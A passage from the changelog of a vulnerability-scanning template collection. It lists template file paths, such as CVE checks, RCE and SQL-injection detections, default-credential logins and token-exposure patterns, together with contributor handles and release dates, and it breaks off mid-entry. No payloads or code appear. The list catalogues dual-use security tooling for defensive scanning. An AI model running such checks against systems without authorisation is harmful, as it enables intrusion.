vulnerabilities/other/ueditor-file-upload.yaml by @princechaddha vulnerabilities/other/wuzhicms-sqli.yaml by @princechaddha Templates v8.2.4 - 5 May 2021 \u00b6 Newly added templates (15) cves/2021/CVE-2021-29441.yaml by @dwisiswant0 cves/2020/CVE-2020-7247.yaml by @princechaddha cves/2019/CVE-2019-8446.yaml by @dhiyaneshDk cves/2018/CVE-2018-10141.yaml by @dhiyaneshDk cves/2017/CVE-2017-12629.yaml by @dwisiswant0 cves/2017/CVE-2017-3506.yaml by @pdteam exposures/configs/oracle-ebs-credentials-disclosure.yaml by @dhiyaneshDk exposures/files/gogs-install-exposure.yaml by @dhiyaneshDk exposures/logs/oracle-ebs-sqllog-disclosure.yaml by @dhiyaneshDk misconfiguration/nginx/nginx-vhost-traffic-status.yaml by @geeknik technologies/kubernetes-version.yaml by @raesene vulnerabilities/other/concrete-xss.yaml by @shifacyclewla , @hackergautam vulnerabilities/other/ecology-filedownload-directory-traversal.yaml by @princechaddha vulnerabilities/other/gloo-unauth.yaml by @dhiyaneshDk vulnerabilities/other/hashicorp-consul-rce.yaml by @pikpikcu Templates v8.2.3 - 2 May 2021 \u00b6 Newly added templates (37) cves/2021/CVE-2021-29442.yaml by @dwisiswant0 cves/2019/CVE-2019-13462.yaml by @securitytest3r cves/2020/CVE-2020-9054.yaml by @DhiyaneshGeek cves/2020/CVE-2020-9315.yaml by @DhiyaneshGeek exposed-panels/circarlife-setup.yaml by @geeknik exposed-panels/netscalar-aaa-login.yaml by @DhiyaneshGeek exposed-panels/sharecenter-login.yaml by @DhiyaneshGeek exposures/backups/exposed-mysql-initial.yaml by @Elsfa7-110 exposures/configs/apache-config.yaml by @hackerrishad exposures/configs/exposed-sharepoint-list.yaml by @Elsfa7-110 exposures/configs/httpd-config.yaml by @hackerrishad exposures/configs/nginx-config.yaml by @hackerrishad exposures/configs/php-fpm-config.yaml by @hackerrishad exposures/configs/proftpd-config.yaml by @hackerrishad exposures/configs/samba-config.yaml by @hackerrishad exposures/configs/svnserve-config.yaml by @hackerrishad exposures/logs/circarlife-system-log.yaml by @geeknik misconfiguration/aem/aem-bg-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-login-status.yaml by @DhiyaneshGeek misconfiguration/spidercontrol-scada-server-info.yaml by @geeknik misconfiguration/springboot/springboot-httptrace.yaml by @pdteam network/deprecated-sshv1-detection.yaml by @iamthefrogy network/ganglia-xml-grid-monitor.yaml by @geeknik network/java-rmi-detect.yaml by @F1tz network/weblogic-iiop-detect.yaml by @F1tz network/weblogic-t3-detect.yaml by @F1tz takeovers/freshservice-takeover.yaml by @pdelteil technologies/nginx-version.yaml by @pdelteil vulnerabilities/other/WooYun-2015-148227.yaml by @princechaddha vulnerabilities/other/chamilo-lms-sqli.yaml by @underfl0w vulnerabilities/other/ecology-springframework-directory-traversal.yaml by @princechaddha vulnerabilities/other/landray-oa-fileread.yaml by @pikpikcu vulnerabilities/other/spark-webui-unauth.yaml by @princechaddha vulnerabilities/other/unauth-spark-api.yaml by @princechaddha vulnerabilities/other/xiuno-bbs-reinstallation.yaml by @princechaddha vulnerabilities/other/xunchi-file-read.yaml by @princechaddha vulnerabilities/other/zcms-v3-sqli.yaml by @princechaddha Templates v8.2.2 - 23 April 2021 \u00b6 Newly added templates (27) cves/2021/CVE-2021-27905.yaml by @shifa123 cves/2021/CVE-2021-24146.yaml by @random-robbie cves/2020/CVE-2020-35338.yaml by @jeyaseelan8 cves/2019/CVE-2019-15859.yaml by @geeknik cves/2019/CVE-2019-10068.yaml by @davidmckennirey cves/2018/CVE-2018-8770.yaml by @princechaddha cves/2018/CVE-2018-17246.yaml by @princechaddha cves/2017/CVE-2017-8917.yaml by @princechaddha cves/2017/CVE-2017-5521.yaml by @geeknik cves/2017/CVE-2017-15715.yaml by @geeknik cves/2015/CVE-2015-8399.yaml by @princechaddha cves/2015/CVE-2015-7297.yaml by @princechaddha cves/2014/CVE-2014-4210.yaml by @princechaddha cves/2014/CVE-2014-3704.yaml by @princechaddha cves/2014/CVE-2014-2321.yaml by @geeknik vulnerabilities/apache/apache-solr-file-read.yaml by @DhiyaneshGeek vulnerabilities/other/74cms-sqli.yaml by @princechaddha vulnerabilities/other/feifeicms-lfr.yaml by @princechaddha vulnerabilities/other/maccmsv10-backdoor.yaml by @princechaddha vulnerabilities/other/myucms-lfr.yaml by @princechaddha vulnerabilities/other/nuuo-file-inclusion.yaml by @princechaddha misconfiguration/unauthenticated-popup-upload.yaml by @DhiyaneshGeek default-logins/chinaunicom/chinaunicom-modem-default-credentials.yaml by @princechaddha default-logins/viewpoint/trilithic-viewpoint-default.yaml by @davidmckennirey exposed-panels/opennms-web-console.yaml by @DhiyaneshGeek exposures/configs/cisco-network-config.yaml by @DhiyaneshGeek technologies/grav-cms-detect.yaml by @cydave Templates v8.2.1 - 20 April 2021 \u00b6 Newly added templates (24) cves/2021/CVE-2021-28937.yaml by @geeknik cves/2021/CVE-2021-3374.yaml by @geeknik cves/2020/CVE-2020-19625.yaml by @geeknik cves/2017/CVE-2017-12542.yaml by @pikpikcu cves/2019/CVE-2019-17270.yaml by @pikpikcu cves/2015/CVE-2015-1880.yaml by @pikpikcu cves/2011/CVE-2011-0049.yaml by @pikpikcu cves/2009/CVE-2009-1151.yaml by @princechaddha exposures/configs/exposed-authentication-asmx.yaml by @DhiyaneshGeek exposures/configs/kyan-network-credentials-disclosure.yaml by @pikpikcu exposures/configs/ruijie-smartweb-disclosure.yaml by @pikpikcu exposures/configs/saia-web-server-info.yaml by @DhiyaneshGeek exposures/configs/ssh-authorized-keys.yaml by @geeknik exposures/configs/ssh-known-hosts.yaml by @geeknik exposures/files/phpunit.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-wordfence-waf-bypass-xss.yaml by @shifa123 misconfiguration/laravel-debug-enabled.yaml by @notsoevilweasel misconfiguration/sonarqube-public-projects.yaml by @sickwell exposed-panels/polycom-login.yaml by @DhiyaneshGeek exposed-panels/sauter-login.yaml by @DhiyaneshGeek fuzzing/wordpress-plugins-detect.yaml by @0xcrypto fuzzing/wordpress-themes-detect.yaml by @0xcrypto technologies/mautic-crm-detect.yaml by @cydave technologies/plone-cms-detect.yaml by @cydave Templates v8.2.0 - 14 April 2021 \u00b6 Newly added templates (73) exposed-tokens moved under exposures/tokens directory. cves/2021/CVE-2021-30151.yaml by @DhiyaneshDk cves/2020/CVE-2020-15500.yaml by @Akash .C cves/2020/CVE-2020-35846.yaml by @dwisiswant0 cves/2020/CVE-2020-35847.yaml by @dwisiswant0 cves/2020/CVE-2020-35848.yaml by @dwisiswant0 cves/2018/CVE-2018-2894.yaml by @geeknik cves/2018/CVE-2018-7422.yaml by @LuskaBol cves/2017/CVE-2017-7921.yaml by @princechaddha misconfiguration/aem/aem-default-get-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-gql-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-hash-querybuilder.yaml by @DhiyaneshGeek misconfiguration/aem/aem-jcr-querybuilder.yaml by @DhiyaneshGeek misconfiguration/aem/aem-merge-metadata-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-feed-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-internal-path-read.yaml by @DhiyaneshGeek misconfiguration/aem/aem-querybuilder-json-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-userinfo-servlet.yaml by @DhiyaneshGeek misconfiguration/aem/aem-wcm-suggestions-servlet.yaml by @DhiyaneshGeek misconfiguration/aws-object-listing.yaml by @DhiyaneshGeek misconfiguration/gitlab/gitlab-user-enumeration.yaml by @pikpikcu misconfiguration/unautneicated-cache-purge.yaml by @xElkomy vulnerabilities/moodle/moodle-xss.yaml by @shifa123 vulnerabilities/other/core-chuangtian-cloud-rce.yaml by @pikpikcu vulnerabilities/other/empirecms-xss.yaml by @pikpikcu vulnerabilities/other/erp-nc-directory-traversal.yaml by @pikpikcu vulnerabilities/other/etouch-v2-sqli.yaml by @pikpikcu vulnerabilities/other/eyou-email-rce.yaml by @pikpikcu vulnerabilities/other/oa-v9-uploads-file.yaml by @pikpikcu vulnerabilities/other/qi-anxin-netkang-next-generation-firewall-rce.yaml by @pikpikcu vulnerabilities/other/turbocrm-xss.yaml by @pikpikcu network/mysql-native-cred-bruteforce.yaml by @iamthefrogy network/openssh5.3-detect.yaml by @iamthefrogy default-logins/nagios/nagios-default-credential.yaml by @iamthefrogy default-logins/smartweb/ruijie-smartweb-default-password.yaml by @pikpikcu exposed-panels/somfy-login.yaml by @DhiyaneshGeek exposures/configs/coremail-config-disclosure.yaml by @princechaddha exposures/configs/s3cmd-config.yaml by @Ice3man543 exposures/configs/yii-debugger.yaml by @geeknik exposures/logs/access-log.yaml by @sheikhrishad exposures/logs/laravel-telescope.yaml by @geeknik exposures/tokens/amazon/amazon-sns-topic.yaml by @Ice3man543 exposures/tokens/artifactory/artifactory-api-password.yaml by @Ice3man543 exposures/tokens/artifactory/artifactory-api-token.yaml by @Ice3man543 exposures/tokens/bitly/bitly-secret-key.yaml by @Ice3man543 exposures/tokens/cloudinary/cloudinary-credentials.yaml by @Ice3man543 exposures/tokens/discord/discord-webhook.yaml by @Ice3man543 exposures/tokens/generic/jdbc-connection-string.yaml by @Ice3man543 exposures/tokens/generic/jwt-token.yaml by @Ice3man543 exposures/tokens/google/google-calendar-link.yaml by @Ice3man543 exposures/tokens/google/oauth-access-key.yaml by @Ice3man543 exposures/tokens/microsoft/microsoft-teams-webhook.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-admin-api-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-insights-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-rest-api-key.yaml by @Ice3man543 exposures/tokens/newrelic/newrelic-synthetics-location-key.yaml by @Ice3man543 exposures/tokens/paypal/braintree-access-token.yaml by @Ice3man543 exposures/tokens/picatic/picatic-api-key.yaml by @Ice3man543 exposures/tokens/sendgrid/sendgrid-api-key.yaml by @Ice3man543 exposures/tokens/slack/slack-user-token.yaml by @Ice3man543 exposures/tokens/slack/slack-webhook-token.yaml by @Ice3man543 exposures/tokens/sonarqube/sonarqube-token.yaml by @Ice3man543 exposures/tokens/stripe/stripe-restricted-key.yaml by @Ice3man543 exposures/tokens/stripe/stripe-secret-key.yaml by @Ice3man543 exposures/tokens/zapier/zapier-webhook-token.yaml by @Ice3man543 exposures/tokens/zoho/zoho-webhook-token.yaml by @Ice3man543 miscellaneous/display-via-header.yaml by @geeknik technologies/aws-bucket-service.yaml by @pdteam technologies/cockpit-detect.yaml by @dwisiswant0 technologies/google-bucket-service.yaml by @pdteam workflows/aem-workflow.yaml by @DhiyaneshGeek workflows/cockpit-workflow.yaml by @dwisiswant0 workflows/gitlab-workflow.yaml by @pdteam workflows/ruijie-workflow.yaml by @pikpikcu Templates v8.1.9 - 2 April 2021 \u00b6 Newly added templates (7) cves/2021/CVE-2021-21402.yaml by @dwisiswant0 cves/2020/CVE-2020-24550.yaml by @DhiyaneshGeek exposures/configs/netrc.yaml by @geeknik iot/upnp-device.yaml by @geeknik technologies/jellyfin-detect.yaml by @dwisiswant0 vulnerabilities/generic/cache-poisoning.yaml by @melbadry9 workflows/jellyfin-workflow.yaml by @dwisiswant0 Templates v8.1.8 - 1 April 2021 \u00b6 Newly added templates (46) cves/2021/CVE-2021-21975.yaml by @luci cves/2021/CVE-2021-26295.yaml by @madrobot cves/2020/CVE-2020-15148.yaml by @pikpikcu cves/2020/CVE-2020-17453.yaml by @madrobot cves/2020/CVE-2020-23517.yaml by @geeknik cves/2020/CVE-2020-25078.yaml by @pikpikcu cves/2020/CVE-2020-28208.yaml by @pdteam cves/2020/CVE-2020-35489.yaml by @soyelmago cves/2015/CVE-2015-3337.yaml by @pdteam cves/2016/CVE-2016-10033.yaml by @princechaddha cves/2017/CVE-2017-1000170.yaml by @dwisiswant0 cves/2017/CVE-2017-17562.yaml by @geeknik cves/2018/CVE-2018-0101.yaml by @dwisiswant0 exposed-panels/adobe-component-login.yaml by @DhiyaneshGeek exposed-panels/fiorilaunchpad-logon.yaml by @DhiyaneshGeek exposed-panels/joomla-panel.yaml by @its0x08 exposed-panels/netlify-cms.yaml by @sullo exposed-panels/open-stack-dashboard-login.yaml by @dhiyaneshDK exposed-panels/sitefinity-login.yaml by @dhiyaneshDK exposed-panels/wago-plc-panel.yaml by @its0x08 exposed-panels/wordpress-login.yaml by @its0x08 exposed-panels/zte-panel.yaml by @its0x08 exposures/backups/settings-php-files.yaml by @hackerrishad exposures/configs/eea-disclosure.yaml by @pikpikcu fuzzing/adminer-panel-fuzz.yaml by @geeknik fuzzing/header-command-injection.yaml by @geeknik fuzzing/wp-plugin-scan.yaml by @pdteam iot/liveview-axis-camera.yaml by @DhiyaneshGeek iot/mobotix-guest-camera.yaml by @DhiyaneshGeek iot/nuuno-network-login.yaml by @DhiyaneshGeek miscellaneous/detect-dns-over-https.yaml by @geeknik miscellaneous/detect-options-method.yaml by @pdteam miscellaneous/unpatched-coldfusion.yaml by @Daviey misconfiguration/gitlab/gitlab-public-signup.yaml by @pdteam misconfiguration/phpmyadmin-setup.yaml by @thevillagehacker takeovers/freshdesk-takeover.yaml by @NagliNagli takeovers/medium-takeover.yaml by @rtcms technologies/bolt-cms-detect.yaml by @cydave technologies/bookstack-detect.yaml by @cydave technologies/moinmoin-detect.yaml by @cydave technologies/opencast-detect.yaml by @cydave technologies/shopware-detect.yaml by @cydave technologies/strapi-cms-detect.yaml by @cydave vulnerabilities/rockethcat/unauth-message-read.yaml by @rojan-rijal vulnerabilities/thinkcmf/thinkcmf-arbitrary-code-execution.yaml by @pikpikcu workflows/worksite-takeover-workflow.yaml @pdteam Templates v8.1.7 - 21 Mar 2021 \u00b6 Newly added templates (0) Bug fixes Templates v8.1.6 - 21 Mar 2021 \u00b6 Newly added templates (22) cves/2021/CVE-2021-22986.yml by @iamnoooob @rootxharsh cves/2020/CVE-2020-14883.yaml by @pikpikcu cves/2020/CVE-2020-16139.yaml by @pikpikcu cves/2020/CVE-2020-29164.yaml by @geeknik cves/2020/CVE-2020-9483.yaml by @pikpikcu cves/2018/CVE-2018-11784.yaml by @geeknik cves/2019/CVE-2019-0230.yaml by @geeknik default-logins/xxljob/xxljob-default-login.yaml by pdteam dns/ec2-detection.yaml by @melbadry9 dns/worksites-detection.yaml by @melbadry9 exposed-panels/aims-password-portal.yaml by @DhiyaneshGeek exposed-panels/pandora-fms-console.yaml by @DhiyaneshGeek iot/contacam.yaml by @DhiyaneshGeek iot/epmp-login.yaml by @DhiyaneshGeek iot/hp-laserjet-detect.yaml by @DhiyaneshGeek iot/internet-service.yaml by @DhiyaneshGeek misconfiguration/exposed-sqlite-manager.yaml by @DhiyaneshGeek vulnerabilities/generic/error-based-sql-injection.yaml by @geeknik vulnerabilities/other/tpshop-directory-traversal.yaml by @pikpikcu vulnerabilities/other/viewlinc-crlf-injection.yaml by @geeknik vulnerabilities/other/xdcms-sqli.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-infinitewp-auth-bypass.yaml by @princechaddha Templates v8.1.5 - 15 Mar 2021 \u00b6 Newly added templates (30) cves/2021/CVE-2021-25281.yaml by @madrobot cves/2020/CVE-2020-13700.yaml by @pikpikcu cves/2020/CVE-2020-14092.yaml by @princechaddha cves/2020/CVE-2020-24186.yaml by @Ganofins cves/2020/CVE-2020-35951.yaml by @princechaddha cves/2018/CVE-2018-1207.yaml by @dwisiswant0 cves/2018/CVE-2018-18778.yaml by @dhiyaneshDK cves/2018/CVE-2018-3810.yaml by @princechaddha cves/2018/CVE-2018-6910.yaml by @pikpikcu cves/2018/CVE-2018-7700.yaml by @pikpikcu cves/2017/CVE-2017-3881.yaml by @dwisiswant0 cves/2015/CVE-2015-3306.yaml by @pdteam default-logins/dvwa/dvwa-default-login.yaml @pdteam exposed-panels/cisco-finesse-login.yaml by @dhiyaneshDK exposed-panels/mini-start-page.yaml by @dhiyaneshDK exposed-panels/tuxedo-connected-controller.yaml by @dhiyaneshDK exposures/configs/circleci-config.yaml by @geeknik exposures/configs/circleci-ssh-config.yaml by @geeknik misconfiguration/gitlab/gitlab-public-repos.yaml by @ldionmarcil misconfiguration/panasonic-network-management.yaml by @dhiyaneshDk network/unauth-ftp.yaml by @C3l3si4n technologies/openam-detection.yaml by @xelkomy technologies/thinkcmf-detection.yaml by @pikpikcu vulnerabilities/moodle/moodle-jitsi-plugin-xss.yaml by @aceseven vulnerabilities/other/parentlink-xss.yaml by @r3naissance vulnerabilities/other/pmb-local-file-disclosure.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-auth-bypass-wptimecapsule.yaml by @princechaddha vulnerabilities/wordpress/wordpress-rce-simplefilelist.yaml by @princechaddha vulnerabilities/wordpress/wordpress-total-upkeep-backup-download.yaml by @princechaddha Templates v8.1.4 - 10 Mar 2021 \u00b6 Newly added templates (17) cves/2021/CVE-2021-21978.yaml @dwisiswant0 cves/2020/CVE-2020-12256.yaml by @pikpikcu cves/2020/CVE-2020-12259.yaml by @pikpikcu cves/2020/CVE-2020-13483.yaml by @pikpikcu cves/2020/CVE-2020-14413.yaml by @pikpikcu cves/2015/CVE-2015-2080.yaml by @pikpikcu exposed-panels/cisco-sd-wan.yaml by @z3bd headless/dvwa-headless-automatic-login.yaml headless/postmessage-tracker.yaml headless/prototype-pollution-check.yaml headless/window-name-domxss.yaml misconfiguration/http-etcd-unauthenticated-api-data-leak.yaml by @DhiyaneshGeek network/exposed-redis.yaml network/exposed-zookeeper.yaml network/memcached-stats.yaml network/mongodb-detect.yaml network/mongodb-unauth.yaml Templates v8.1.3 - 9 March 2021 \u00b6 Newly added templates (08) default-logins/nexus/nexus-default-password.yaml by @pikpikcu exposed-panels/oki-data.yaml by @DhiyaneshGeek exposed-panels/weatherlink.yaml by @DhiyaneshGeek exposed-panels/wso2-management-console.yaml by @DhiyaneshGeek exposures/configs/ruijie-information-disclosure.yaml by @DhiyaneshGeek misconfiguration/gitlab-snippets.yaml misconfiguration/solr-query-dashboard.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-mongo-express.yaml by @DhiyaneshGeek Templates v8.1.2 - 6 March 2021 \u00b6 Newly added templates (40) cves/2021/CVE-2021-21315.yaml by @pikpikcu cves/2021/CVE-2021-26855.yaml by @Mad-robot cves/2021/CVE-2021-27132.yaml by @geeknik cves/2021/CVE-2021-27330.yaml by @pikpikcu cves/2020/CVE-2020-21224.yaml by @pikpikcu cves/2020/CVE-2020-26948.yaml by @dwisiswant0 cves/2019/CVE-2019-0221.yaml by @pikpikcu cves/2019/CVE-2019-17538.yaml by @pussycat0x cves/2018/CVE-2018-11776.yaml by @pikpikcu cves/2017/CVE-2017-12611.yaml by @pikpikcu cves/2017/CVE-2017-9791.yaml by @pikpikcu cves/2017/CVE-2017-9805.yaml by @pikpikcu cves/2013/CVE-2013-1965.yaml by @pikpikcu cves/2012/CVE-2012-0392.yaml by @pikpikcu cves/2008/CVE-2008-2650.yaml by @pussycat0x cves/2007/CVE-2007-4556.yaml by @pikpikcu default-logins/alibaba/alibaba-canal-default-password.yaml by @pikpikcu exposed-panels/acunetix-panel.yaml by @joanbono exposed-panels/advance-setup.yaml by @DhiyaneshGeek exposed-panels/blue-iris-login.yaml by @DhiyaneshGeek exposed-panels/checkmarx-panel.yaml by @joanbono exposed-panels/cisco-integrated-login.yaml by @DhiyaneshGeek exposed-panels/cisco-security-details.yaml by @DhiyaneshGeek exposed-panels/hivemanager-login-panel.yaml by @binaryfigments exposed-panels/hmc-hybris-panel.yaml by @dogasantos exposed-panels/keenetic-web-login.yaml by @DhiyaneshGeek exposed-panels/nessus-panel.yaml by @joanbono exposed-panels/remote-ui-login.yaml by @DhiyaneshGeek exposed-panels/sphider-login.yaml by @DhiyaneshGeek exposed-panels/total-web.yaml by @DhiyaneshGeek exposures/configs/exposed-bitkeeper.yaml by @daffainfo exposures/configs/exposed-bzr.yaml by @daffainfo exposures/configs/exposed-darcs.yaml by @daffainfo exposures/configs/exposed-hg.yaml by @daffainfo exposures/configs/joomla-config-file.yaml by @oppsec misconfiguration/d-link-arbitary-fileread.yaml by @DhiyaneshGeek technologies/burp-api-detect.yaml by @joanbono technologies/ilo-detect.yaml by @milo2012 technologies/microsoft-echange-server-detect.yaml by @pikpikcu vulnerabilities/other/simple-employee-rce.yaml by @pikpikcu Templates v8.1.1 - 1 March 2021 \u00b6 Newly added templates (34) cves/2021/CVE-2021-3129.yaml by @z3bd cves/2021/CVE-2021-3378.yaml by @dwisiswant0 cves/2020/CVE-2020-11853.yaml by @dwisiswant0 cves/2020/CVE-2020-11854.yaml by @dwisiswant0 cves/2020/CVE-2020-35729.yaml by @dwisiswant0 cves/2018/CVE-2018-1335.yaml by @pikpikcu cves/2017/CVE-2017-16877.yaml by @pikpikcu cves/2010/CVE-2010-2861.yaml by @pikpikcu default-logins/UCMDB/micro-focus-ucmdb-default-credentials.yaml by @dwisiswant0 default-logins/axis2/axis2-default-password.yaml by @pikpikcu default-logins/dell/dell-idrac9-default-login.yaml by @kophjager007 default-logins/frps/frp-default-credentials.yaml by @pikpikcu exposed-panels/crush-ftp-login.yaml by @DhiyaneshGeek exposed-panels/d-link-wireless.yaml by @DhiyaneshGeek exposed-panels/jfrog.yaml by @DhiyaneshGeek exposed-panels/microsoft-exchange-login.yaml by @DhiyaneshGeek exposed-panels/plesk-onyx.yaml by @DhiyaneshGeek exposed-panels/powerlogic-ion.yaml by @DhiyaneshGeek exposed-panels/radius-manager.yaml by @DhiyaneshGeek exposed-panels/siteomat-login.yaml by @DhiyaneshGeek exposed-panels/unauthenticated-frp.yaml by @pikpikcu exposed-panels/vigor-login.yaml by @DhiyaneshGeek exposed-panels/vmware-horizon.yaml by @DhiyaneshGeek exposed-panels/web-local-craft.yaml by @DhiyaneshGeek exposed-panels/xenmobile-login.yaml by @DhiyaneshGeek miscellaneous/moodle-changelog.yaml by @oppsec misconfiguration/phpmyadmin-wooyun.yaml by @DhiyaneshGeek technologies/dell/dell-idrac6-detect.yaml by @kophjager007 technologies/dell/dell-idrac7-detect.yaml by @kophjager007 technologies/dell/dell-idrac8-detect.yaml by @kophjager007 vulnerabilities/other/duomicms-sql-injection.yaml by @pikpikcu vulnerabilities/other/ruijie-networks-lfi.yaml by @pikpikcu vulnerabilities/other/ruijie-networks-rce.yaml by @pikpikcu workflows/micro-focus-workflow.yaml by @dwisiswant0 Templates v8.1.0 - 26 Feb 2021 \u00b6 Newly added templates (32) cves/2021/CVE-2021-21972.yaml by @dwisiswant0 cves/2020/CVE-2020-17496.yaml by @pussycat0x cves/2020/CVE-2020-22840.yaml by @geeknik cves/2017/CVE-2017-7269.yaml by @thomas_from_offensity cves/2016/CVE-2016-7552.yaml by @dwisiswant0 cves/2015/CVE-2015-5688.yaml by @pikpikcu default-logins/dell/dell-idrac-default-login.yaml by @kophjager007 default-logins/rockmongo/rockmongo-default-credentials.yaml by @pikpikcu exposures/apis/openapi.yaml by @pikpikcu exposures/configs/awstats-config.yaml by @hackerrishad exposures/configs/awstats-script.yaml by @hackerrishad exposures/configs/honeywell-scada-config.yaml by @alperenkesk exposures/files/bower-json.yaml by @oppsec exposures/files/yarn-lock.yaml by @oppsec miscellaneous/joomla-htaccess.yaml by @oppsec miscellaneous/joomla-manifest-file.yaml by @oppsec miscellaneous/phpmyadmin-setup.yaml by @hackerrishad misconfiguration/haproxy-status.yaml by @DhiyaneshGeek misconfiguration/horde-unauthenticated.yaml by @pikpikcu misconfiguration/java-melody-exposed.yaml by @DhiyaneshGeek misconfiguration/tcpconfig.yaml by @DhiyaneshGeek misconfiguration/ups-status.yaml by @DhiyaneshGeek technologies/dell-idrac-detect.yaml by @kophjager007 technologies/gunicorn-detect.yaml by @joanbono vulnerabilities/other/rockmongo-xss.yaml by @pikpikcu vulnerabilities/other/weiphp-path-traversal.yaml by @pikpikcu vulnerabilities/other/zhiyuan-oa-info-leak.yaml by @pikpikcu vulnerabilities/other/zhiyuan-oa-session-leak.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-affiliatewp-log.yaml by @DhiyaneshGeek vulnerabilities/wordpress/wp-license-file.yaml by @YashGoti vulnerabilities/wordpress/wp-uploads-listing.yaml by @YashGoti workflows/dell-idrac-workflow.yaml by @kophjager007 Templates v8.0.9 - 22 Feb 2021 \u00b6 Newly added templates (19) cves/2020/CVE-2020-24571.yaml by @pikpikcu cves/2020/CVE-2020-26073.yaml by @madrobot cves/2019/CVE-2019-14205.yaml by @pikpikcu cves/2019/CVE-2019-16097.yaml by @pikpikcu cves/2019/CVE-2019-18393.yaml by @pikpikcu cves/2018/CVE-2018-1000861.yaml by @dhiyaneshDK cves/2018/CVE-2018-12613.yaml by @pikpikcu exposures/configs/ftp-credentials-exposure.yaml by @pikpikcu exposures/configs/sftp-credentials-exposure.yaml by @sheikhrishad exposures/logs/laravel-log-file.yaml by @sheikhrishad exposures/logs/npm-log-file.yaml by @sheikhrishad technologies/harbor-detect.yaml by @pikpikcu vulnerabilities/other/dedecms-openredirect.yaml by @pikpikcu vulnerabilities/other/finereport-path-traversal.yaml by @pikpikcu vulnerabilities/other/metinfo-lfi.yaml by @pikpikcu vulnerabilities/other/seacms-rce.yaml by @pikpikcu vulnerabilities/other/webui-rce.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-xmlrpc-listmethods.yaml by @0ut0fb4nd workflows/harbor-workflow.yaml by @pikpikcu Templates v8.0.8 - 16 Feb 2021 \u00b6 Newly added templates (36) cves/2020/CVE-2020-10546.yaml by @Mad-robot cves/2020/CVE-2020-10547.yaml by @Mad-robot cves/2020/CVE-2020-10548.yaml by @Mad-robot cves/2020/CVE-2020-10549.yaml by @Mad-robot cves/2020/CVE-2020-11991.yaml by @pikpikcu cves/2020/CVE-2020-2036.yaml by @Mad-robot cves/2020/CVE-2020-25213.yaml by @foulenzer cves/2020/CVE-2020\u201326073.yaml by @Mad-robot cves/2020/CVE-2020-27982.yaml by @Mad-robot cves/2020/CVE-2020-5847.yaml by @Mad-robot cves/2020/CVE-2020-9425.yaml by @Mad-robot cves/2019/CVE-2019-3403.yaml by @Ganofins cves/2018/CVE-2018-7600.yaml by @pikpikcu cves/2017/CVE-2017-1000028.yaml by @pikpikcu cves/2017/CVE-2017-12635.yaml by @pikpikcu cves/2016/CVE-2016-3081.yaml by @DhiyaneshGeek cves/2015/CVE-2015-1427.yaml by @pikpikcu cves/2014/CVE-2014-3120.yaml by @pikpikcu default-logins/nps/nps-default-password.yaml by @pikpikcu default-logins/samsung/samsung-wlan-ap-default-credentials.yaml by @pikpikcu exposures/configs/lvmeng-uts-disclosure.yaml by @pikpikcu exposures/files/keycloak-json.yaml by @oppsec misconfiguration/jboss-status.yaml by @DhiyaneshGeek misconfiguration/mikrotik-graph.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-prtg.yaml by @DhiyaneshGeek vulnerabilities/other/cacti-weathermap-file-write.yaml by @pikpikcu vulnerabilities/other/oa-tongda-path-traversal.yaml by @pikpikcu vulnerabilities/other/powercreator-cms-rce.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-lfi.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-rce.yaml by @pikpikcu vulnerabilities/samsung/samsung-wlan-ap-xss.yaml by @pikpikcu vulnerabilities/thinkcmf/thinkcmf-lfi.yaml by @pikpikcu vulnerabilities/thinkcmf/thinkcmf-rce.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-zebra-form-xss.yaml by @Mad-robot workflows/cacti-workflow.yaml by @pikpikcu workflows/samsung-wlan-ap-workflow.yaml by @pikpikcu","title":"Templates"},{"location":"releases/templates-changelog/#changelog","text":"","title":"Changelog"},{"location":"releases/templates-changelog/#templates-v837-30-june-2021","text":"Newly added templates (74) cves/2021/CVE-2021-21234.yaml by @gy741 cves/2021/CVE-2021-21389.yaml by @lotusdll cves/2021/CVE-2021-28164.yaml by @noamrathaus cves/2021/CVE-2021-28169.yaml by @pikpikcu cves/2021/CVE-2021-3223.yaml by @gy741 cves/2021/CVE-2021-35464.yaml by @madrobot cves/2020/CVE-2020-11110.yaml by @emadshanab cves/2020/CVE-2020-11930.yaml by @dhiyaneshDK cves/2020/CVE-2020-25495.yaml by @0x_Akoko cves/2020/CVE-2020-3580.yaml by @0x_Akoko cves/2019/CVE-2019-3401.yaml by @milo2012 cves/2019/CVE-2019-7481.yaml by @_darrenmartyn cves/2018/CVE-2018-16299.yaml by @0x_Akoko cves/2018/CVE-2018-17254.yaml by @Suman_Kar cves/2018/CVE-2018-18775.yaml by @0x_Akoko cves/2018/CVE-2018-18777.yaml by @0x_Akoko cves/2018/CVE-2018-9995.yaml by @princechaddha cves/2017/CVE-2017-12794.yaml by @pikpikcu cves/2017/CVE-2017-15944.yaml by @emadshanab cves/2015/CVE-2015-8813.yaml by @emadshanab cves/2012/CVE-2012-3153.yaml by @sidahmed-malaoui vulnerabilities/wordpress/alfacgiapi-wordpress.yaml by @pussycat0x vulnerabilities/wordpress/wordpress-bbpress-plugin-listing.yaml by @dhiyaneshDK vulnerabilities/wordpress/wordpress-elementor-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-gtranslate-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-redirection-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-updraftplus-pem-key.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-woocommerce-listing.yaml by @dhiyaneshDK vulnerabilities/wordpress/wp-123contactform-plugin-listing.yaml by @pussycat0x vulnerabilities/wordpress/wp-gtranslate-open-redirect.yaml by 